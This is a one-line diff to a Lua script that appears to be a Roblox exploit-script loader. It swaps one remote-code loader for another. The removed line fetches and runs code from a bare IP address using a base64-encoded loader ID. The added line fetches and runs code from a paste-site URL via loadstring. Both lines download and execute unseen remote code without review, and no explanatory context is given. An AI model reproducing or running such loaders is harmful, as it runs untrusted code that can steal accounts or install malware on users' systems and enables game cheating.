@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjgyYTI1MGE0LTIyZmQtNDVkNC05MjAzLWYwMDgwNjNjNzYzOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/z2N62XbV2L/0", true))()
